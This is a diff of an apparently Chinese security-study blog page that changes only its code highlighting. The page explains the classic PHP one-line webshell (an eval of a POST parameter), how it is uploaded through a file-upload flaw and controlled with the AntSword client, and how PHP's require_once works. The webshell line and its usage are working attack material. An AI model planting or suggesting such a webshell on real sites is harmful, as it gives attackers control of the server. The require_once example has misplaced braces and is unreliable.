@@ -202,7 +202,7 @@
     <div class="head-info">
       <span class="post-info-item"><i class="iconfont iconcalendar"></i>February 19, 2021</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>933</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>935</span>
     </div>
   </div>
 </section>
@@ -210,7 +210,7 @@
       <section class="content">
         
         <h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>最简单的一句话：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? php @eval($_POST[&#39;attack&#39;]); ?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span> php @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&#x27;attack&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>​        利用文件上传漏洞，往目标网站中上传一句话木马，然后就可以在本地通过蚁剑即可获取和控制整个网站目录。</p>
 <p>​        @表示后面即使执行错误，也不报错。<strong>eval（）函数</strong>表示括号内的语句字符串什么/.的全都当做代码执行。$_POST[‘attack’]表示从页面中获得attack这个参数值。（也就是[‘     ‘]里的数值可以改变，作为密码）</p>
@@ -220,10 +220,10 @@
 <p> require_once() 语句在脚本执行期间包括并运行指定文件。此行为和 require() 语句类似，唯一区别是如果该文件中的代码已经被包括了，则不会再次包括。</p>
 <p>例子：</p>
 <p>比如你写了一个类文件a.php，这个文件主要是定义类，代码可能如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">p</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $a;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params">&#125;</span></span></span><br><span class="line"><span class="function"><span class="params"> &#123;</span></span></span><br><span class="line"><span class="function"><span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">echo</span> $a;</span></span></span><br><span class="line"><span class="function"><span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params"> &#125;</span></span></span><br><span class="line"><span class="function"><span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params">&#125;</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">p</span></span><br><span class="hljs-class"></span><br><span class="hljs-class"></span>&#123;<br><br><span class="hljs-keyword">public</span> $a;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">make</span>(<span class="hljs-params">&#125;</span></span><br><span class="hljs-function"><span class="hljs-params"> &#123;</span></span><br><span class="hljs-function"><span class="hljs-params"> </span></span><br><span class="hljs-function"><span class="hljs-params"> <span class="hljs-keyword">echo</span> $a;</span></span><br><span class="hljs-function"><span class="hljs-params"> </span></span><br><span class="hljs-function"><span class="hljs-params"> &#125;</span></span><br><span class="hljs-function"><span class="hljs-params"> </span></span><br><span class="hljs-function"><span class="hljs-params">&#125;</span></span><br></code></pre></td></tr></table></figure>
 
 <p>这个时候你在文件b.php中要使用到该类，就可以再b.php开头加上</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require_once(a.php);</span><br></pre></td></tr></table></figure>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">require<span class="hljs-constructor">_once(<span class="hljs-params">a</span>.<span class="hljs-params">php</span>)</span>;<br></code></pre></td></tr></table></figure>
 
 <p>来加载这个a.php，就相当于把a.php的文件的代码复制到了b.php中。</p>
 <p>类似的方法还有requeire(),include(),include_once()其中带_once字样的方法都是声明只加载一次，因为你require_once()的别文件中可能已经require_once(a.php)了，如果再加载就造成重复加载，代码量会增加造成解析减慢。</p>
